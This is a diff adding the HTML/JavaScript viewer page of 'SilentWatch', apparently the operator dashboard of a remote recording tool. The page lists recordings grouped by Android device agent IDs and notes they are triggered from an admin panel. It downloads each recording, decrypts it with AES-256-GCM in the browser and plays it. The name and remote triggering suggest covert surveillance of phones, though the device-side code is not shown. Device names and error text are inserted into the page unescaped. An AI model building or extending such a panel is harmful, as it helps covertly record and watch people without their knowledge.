@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>SilentWatch — Recordings</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#080c14;--surface:#0d1320;--card:#111827;--border:#1e293b;
+  --accent:#00e676;--accent-dim:rgba(0,230,118,.12);
+  --danger:#ff4757;--warn:#ffa502;--blue:#3b82f6;--purple:#a855f7;
+  --text:#e2e8f0;--muted:#64748b;--font:'Inter',sans-serif;
+}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font)}
+body{display:flex;flex-direction:column}
+
+/* ── Header ─────────────────────────────── */
+header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 24px;height:56px;background:var(--surface);
+  border-bottom:1px solid var(--border);flex-shrink:0;
+}
+.logo{display:flex;align-items:center;gap:10px;font-size:.95rem;font-weight:700;letter-spacing:.12em}
+.logo-ring{width:28px;height:28px;border-radius:50%;border:2px solid var(--accent);display:grid;place-items:center}
+.logo-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--accent)}50%{box-shadow:none;opacity:.4}}
+.stats{display:flex;gap:16px;font-size:.75rem;color:var(--muted)}
+.stat-chip{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:4px 12px}
+.stat-chip span{color:var(--accent);font-weight:600}
+
+/* ── Main layout ─────────────────────────── */
+main{flex:1;overflow-y:auto;padding:24px;max-width:960px;margin:0 auto;width:100%}
+
+.empty-state{text-align:center;padding:80px 0;color:var(--muted)}
+.empty-state svg{width:64px;height:64px;margin-bottom:16px;opacity:.3}
+.empty-state p{font-size:.85rem;letter-spacing:.1em;text-transform:uppercase}
+
+/* ── Device section ──────────────────────── */
+.device-section{margin-bottom:28px}
+.device-header{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:12px;padding:0 4px;
+}
+.device-pip{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent)}
+.device-name{font-size:.8rem;font-weight:700;letter-spacing:.08em;color:var(--accent);text-transform:uppercase}
+.device-count{font-size:.7rem;color:var(--muted);margin-left:auto}
+
+/* ── Recording card ──────────────────────── */
+.rec-card{
+  background:var(--card);border:1px solid var(--border);border-radius:12px;
+  padding:16px 20px;margin-bottom:10px;
+  display:flex;align-items:center;gap:16px;
+  transition:border-color .2s,box-shadow .2s;
+}
+.rec-card:hover{border-color:rgba(0,230,118,.3);box-shadow:0 0 0 1px rgba(0,230,118,.1)}
+
+.rec-icon{
+  width:40px;height:40px;border-radius:10px;
+  background:var(--accent-dim);display:grid;place-items:center;flex-shrink:0;
+}
+.rec-icon svg{width:18px;height:18px;color:var(--accent)}
+
+.rec-info{flex:1;min-width:0}
+.rec-time{font-size:.82rem;font-weight:600;color:var(--text);margin-bottom:4px}
+.rec-meta{display:flex;gap:12px;flex-wrap:wrap}
+.rec-badge{
+  font-size:.65rem;font-weight:500;letter-spacing:.06em;text-transform:uppercase;
+  padding:2px 8px;border-radius:4px;border:1px solid;
+}
+.badge-size{color:var(--blue);border-color:rgba(59,130,246,.3);background:rgba(59,130,246,.08)}
+.badge-enc{color:var(--purple);border-color:rgba(168,85,247,.3);background:rgba(168,85,247,.08)}
+.badge-key{color:var(--muted);border-color:var(--border);background:transparent;font-family:'Courier New',monospace}
+
+.rec-actions{display:flex;gap:8px;flex-shrink:0}
+.btn{
+  padding:8px 16px;border-radius:8px;font-family:var(--font);
+  font-size:.78rem;font-weight:600;cursor:pointer;transition:all .18s;
+  border:none;display:flex;align-items:center;gap:6px;
+}
+.btn-play{background:var(--accent);color:#000}
+.btn-play:hover:not(:disabled){background:#00ff88;box-shadow:0 0 16px rgba(0,230,118,.35)}
+.btn-play:disabled{opacity:.4;cursor:not-allowed}
+.btn-dl{background:transparent;color:var(--blue);border:1px solid rgba(59,130,246,.3)}
+.btn-dl:hover:not(:disabled){background:rgba(59,130,246,.1)}
+.btn-dl:disabled{opacity:.4;cursor:not-allowed}
+
+/* ── Progress overlay on card ────────────── */
+.rec-progress{
+  display:none;flex:1;flex-direction:column;gap:6px;
+}
+.rec-progress.active{display:flex}
+.progress-label{font-size:.72rem;color:var(--muted)}
+.progress-bar-wrap{height:4px;background:var(--border);border-radius:2px;overflow:hidden}
+.progress-bar{height:100%;background:var(--accent);border-radius:2px;transition:width .1s;width:0%}
+.progress-bar.indeterminate{width:40%;animation:slide 1s infinite}
+@keyframes slide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}
+
+/* ── Video Modal ──────────────────────────── */
+#modal-overlay{
+  display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
+  z-index:100;flex-direction:column;align-items:center;justify-content:center;
+  padding:24px;gap:16px;
+}
+#modal-overlay.open{display:flex}
+#modal-header{
+  display:flex;align-items:center;justify-content:space-between;
+  width:100%;max-width:900px;
+}
+#modal-title{font-size:.85rem;font-weight:600;color:var(--accent);letter-spacing:.08em}
+#btn-close{
+  background:var(--card);border:1px solid var(--border);color:var(--text);
+  width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:1rem;
+  display:grid;place-items:center;transition:background .2s;
+}
+#btn-close:hover{background:var(--danger);border-color:var(--danger)}
+#modal-video{
+  width:100%;max-width:900px;max-height:80vh;border-radius:12px;
+  background:#000;outline:none;border:1px solid var(--border);
+}
+#modal-info{
+  font-size:.7rem;color:var(--muted);font-family:'Courier New',monospace;
+  max-width:900px;width:100%;text-align:center;
+}
+
+/* ── Toast ───────────────────────────────── */
+#toast{
+  position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);
+  background:var(--card);border:1px solid var(--border);
+  color:var(--text);padding:10px 20px;border-radius:8px;font-size:.8rem;
+  transition:transform .3s;z-index:200;pointer-events:none;
+}
+#toast.show{transform:translateX(-50%) translateY(0)}
+#toast.err{border-color:var(--danger);color:var(--danger)}
+
+/* ── Loading spinner ─────────────────────── */
+.spinner{
+  width:32px;height:32px;border:3px solid var(--border);
+  border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header>
+  <div class="logo">
+    <div class="logo-ring"><div class="logo-dot"></div></div>
+    SILENTWATCH <span style="color:var(--muted);font-weight:400;margin-left:8px">/ Recordings</span>
+  </div>
+  <div class="stats">
+    <div class="stat-chip">Total: <span id="s-total">—</span></div>
+    <div class="stat-chip">Size: <span id="s-size">—</span></div>
+    <div class="stat-chip">Devices: <span id="s-devices">—</span></div>
+  </div>
+</header>
+
+<!-- Main -->
+<main id="main">
+  <div class="empty-state" id="empty">
+    <div class="spinner" style="margin:0 auto 20px"></div>
+    <p>Loading recordings…</p>
+  </div>
+</main>
+
+<!-- Video Modal -->
+<div id="modal-overlay">
+  <div id="modal-header">
+    <div id="modal-title">▶ Now Playing</div>
+    <button id="btn-close" onclick="closeModal()">✕</button>
+  </div>
+  <video id="modal-video" controls autoplay></video>
+  <div id="modal-info"></div>
+</div>
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<script>
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function hexToBytes(hex) {
+  const b = new Uint8Array(hex.length / 2);
+  for (let i = 0; i < hex.length; i += 2) b[i/2] = parseInt(hex.substr(i,2),16);
+  return b;
+}
+
+function fmtDate(ts) {
+  return new Date(Number(ts)).toLocaleString([], {
+    month:'short', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit'
+  });
+}
+
+function fmtSize(kb) {
+  if (!kb) return '—';
+  return kb >= 1024 ? (kb/1024).toFixed(1)+' MB' : kb+' KB';
+}
+
+function toast(msg, err=false) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'show' + (err ? ' err' : '');
+  setTimeout(() => t.className = '', 3000);
+}
+
+// ── AES-256-GCM Decryption ────────────────────────────────────────────────────
+async function decryptRecording(encryptedBuffer, keyHex) {
+  // File format: IV[12 bytes] | AES-GCM ciphertext+tag
+  const raw    = new Uint8Array(encryptedBuffer);
+  const iv     = raw.slice(0, 12);          // prepended IV
+  const cipher = raw.slice(12);             // ciphertext + 16-byte GCM tag
+
+  const keyBytes = hexToBytes(keyHex);
+  const cryptoKey = await crypto.subtle.importKey(
+    'raw', keyBytes, { name: 'AES-GCM' }, false, ['decrypt']
+  );
+
+  return crypto.subtle.decrypt(
+    { name: 'AES-GCM', iv, tagLength: 128 },
+    cryptoKey,
+    cipher
+  );
+}
+
+// ── Download with progress ─────────────────────────────────────────────────────
+async function downloadWithProgress(key, onProgress) {
+  const resp = await fetch(`/api/download?key=${encodeURIComponent(key)}`);
+  if (!resp.ok) throw new Error(`Download failed: HTTP ${resp.status}`);
+
+  const total = Number(resp.headers.get('Content-Length') || 0);
+  const reader = resp.body.getReader();
+  const chunks = [];
+  let received = 0;
+
+  while (true) {
+    const { done, value } = await reader.read();
+    if (done) break;
+    chunks.push(value);
+    received += value.length;
+    if (total > 0) onProgress(received / total);
+  }
+
+  const merged = new Uint8Array(received);
+  let offset = 0;
+  for (const c of chunks) { merged.set(c, offset); offset += c.length; }
+  return merged.buffer;
+}
+
+// ── Play a recording ──────────────────────────────────────────────────────────
+async function playRecording(objectKey, keyHex, meta, cardEl) {
+  const progressDiv   = cardEl.querySelector('.rec-progress');
+  const progressBar   = cardEl.querySelector('.progress-bar');
+  const progressLabel = cardEl.querySelector('.progress-label');
+  const btnPlay  = cardEl.querySelector('.btn-play');
+  const btnDl    = cardEl.querySelector('.btn-dl');
+
+  btnPlay.disabled = true;
+  btnDl.disabled   = true;
+  progressDiv.classList.add('active');
+
+  try {
+    // Step 1: Download
+    progressLabel.textContent = 'Downloading encrypted file…';
+    progressBar.classList.remove('indeterminate');
+
+    const encryptedBuffer = await downloadWithProgress(objectKey, pct => {
+      progressBar.style.width = (pct * 100).toFixed(1) + '%';
+    });
+
+    // Step 2: Decrypt
+    progressLabel.textContent = 'Decrypting…';
+    progressBar.style.width = '100%';
+    progressBar.classList.add('indeterminate');
+
+    const decrypted = await decryptRecording(encryptedBuffer, keyHex);
+
+    // Step 3: Play
+    progressBar.classList.remove('indeterminate');
+    const blob = new Blob([decrypted], { type: 'video/mp4' });
+    const url  = URL.createObjectURL(blob);
+
+    const video = document.getElementById('modal-video');
+    if (video._prevUrl) URL.revokeObjectURL(video._prevUrl);
+    video._prevUrl = url;
+    video.src = url;
+
+    document.getElementById('modal-title').textContent =
+      `▶  ${meta.agent_id || 'Unknown device'}  ·  ${fmtDate(meta.timestamp)}`;
+
+    document.getElementById('modal-info').textContent =
+      `${fmtSize(meta.size_kb)}  ·  AES-256-GCM  ·  key ${keyHex.slice(0,8)}…`;
+
+    document.getElementById('modal-overlay').classList.add('open');
+
+  } catch (err) {
+    toast('Error: ' + err.message, true);
+    console.error(err);
+  } finally {
+    progressDiv.classList.remove('active');
+    progressBar.style.width = '0%';
+    progressLabel.textContent = '';
+    btnPlay.disabled = false;
+    btnDl.disabled   = false;
+  }
+}
+
+// ── Download (no playback) ────────────────────────────────────────────────────
+async function downloadOnly(objectKey, ts, cardEl) {
+  const progressDiv   = cardEl.querySelector('.rec-progress');
+  const progressBar   = cardEl.querySelector('.progress-bar');
+  const progressLabel = cardEl.querySelector('.progress-label');
+  const btnPlay  = cardEl.querySelector('.btn-play');
+  const btnDl    = cardEl.querySelector('.btn-dl');
+
+  btnPlay.disabled = true;
+  btnDl.disabled   = true;
+  progressDiv.classList.add('active');
+  progressLabel.textContent = 'Downloading…';
+
+  try {
+    const enc = await downloadWithProgress(objectKey, pct => {
+      progressBar.style.width = (pct * 100).toFixed(1) + '%';
+    });
+    const blob = new Blob([enc], { type: 'application/octet-stream' });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href     = url;
+    a.download = `rec_${ts}.aes`;
+    a.click();
+    setTimeout(() => URL.revokeObjectURL(url), 5000);
+    toast('Download complete — ' + a.download);
+  } catch (err) {
+    toast('Download failed: ' + err.message, true);
+  } finally {
+    progressDiv.classList.remove('active');
+    progressBar.style.width = '0%';
+    progressLabel.textContent = '';
+    btnPlay.disabled = false;
+    btnDl.disabled   = false;
+  }
+}
+
+// ── Modal ─────────────────────────────────────────────────────────────────────
+function closeModal() {
+  const overlay = document.getElementById('modal-overlay');
+  const video   = document.getElementById('modal-video');
+  overlay.classList.remove('open');
+  video.pause();
+  video.src = '';
+}
+
+document.getElementById('modal-overlay').addEventListener('click', e => {
+  if (e.target === e.currentTarget) closeModal();
+});
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeModal();
+});
+
+// ── Render recordings ─────────────────────────────────────────────────────────
+function renderRecordings(data) {
+  const main = document.getElementById('main');
+  main.innerHTML = '';
+
+  if (!data || Object.keys(data).length === 0) {
+    main.innerHTML = `
+      <div class="empty-state">
+        <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="4" y="12" width="40" height="30" rx="3" stroke="currentColor" stroke-width="2"/>
+          <path d="M44 22L60 14V50L44 42V22Z" stroke="currentColor" stroke-width="2"/>
+        </svg>
+        <p>No recordings yet</p>
+        <p style="margin-top:8px;font-size:.7rem">Trigger a recording from the admin panel</p>
+      </div>`;
+    return;
+  }
+
+  let totalCount = 0, totalKb = 0;
+  const deviceIds = Object.keys(data).sort();
+
+  document.getElementById('s-devices').textContent = deviceIds.length;
+
+  deviceIds.forEach(deviceId => {
+    const deviceRecs = data[deviceId];
+    if (!deviceRecs) return;
+
+    const timestamps = Object.keys(deviceRecs).sort((a,b) => b - a); // newest first
+    totalCount += timestamps.length;
+
+    const section = document.createElement('div');
+    section.className = 'device-section';
+
+    const displayName = deviceId.replace('android_device_', '').replace(/_/g,' ');
+    section.innerHTML = `
+      <div class="device-header">
+        <div class="device-pip"></div>
+        <div class="device-name">${displayName}</div>
+        <div class="device-count">${timestamps.length} recording${timestamps.length !== 1 ? 's' : ''}</div>
+      </div>`;
+
+    timestamps.forEach(ts => {
+      const rec = deviceRecs[ts];
+      if (!rec) return;
+
+      totalKb += rec.size_kb || 0;
+
+      const objectKey = rec.object_key || rec.url?.split('/pradip65/')[1] || '';
+
+      const card = document.createElement('div');
+      card.className = 'rec-card';
+      card.innerHTML = `
+        <div class="rec-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <polygon points="10,8 16,12 10,16"/>
+          </svg>
+        </div>
+        <div class="rec-info">
+          <div class="rec-time">${fmtDate(ts)}</div>
+          <div class="rec-meta">
+            <span class="rec-badge badge-size">${fmtSize(rec.size_kb)}</span>
+            <span class="rec-badge badge-enc">${rec.cipher || 'AES-256-GCM'}</span>
+            <span class="rec-badge badge-key">key ${(rec.key || '').slice(0,8)}…</span>
+          </div>
+        </div>
+        <div class="rec-progress">
+          <div class="progress-label"></div>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <div class="rec-actions">
+          <button class="btn btn-dl" title="Download encrypted file">↓ Save</button>
+          <button class="btn btn-play">▶ Play</button>
+        </div>`;
+
+      const btnPlay = card.querySelector('.btn-play');
+      const btnDl   = card.querySelector('.btn-dl');
+
+      btnPlay.addEventListener('click', () =>
+        playRecording(objectKey, rec.key, { ...rec, timestamp: ts, agent_id: deviceId }, card)
+      );
+
+      btnDl.addEventListener('click', () =>
+        downloadOnly(objectKey, ts, card)
+      );
+
+      section.appendChild(card);
+    });
+
+    main.appendChild(section);
+  });
+
+  document.getElementById('s-total').textContent   = totalCount;
+  document.getElementById('s-size').textContent    = fmtSize(totalKb);
+}
+
+// ── Boot ──────────────────────────────────────────────────────────────────────
+async function loadRecordings() {
+  try {
+    const resp = await fetch('/api/recordings');
+    const data = await resp.json();
+    renderRecordings(data);
+  } catch (err) {
+    document.getElementById('main').innerHTML = `
+      <div class="empty-state">
+        <p style="color:var(--danger)">Failed to load recordings</p>
+        <p style="margin-top:8px;font-size:.7rem;color:var(--muted)">${err.message}</p>
+      </div>`;
+  }
+}
+
+loadRecordings();
+// Auto-refresh every 30 seconds
+setInterval(loadRecordings, 30_000);
+</script>
+</body>
+</html>
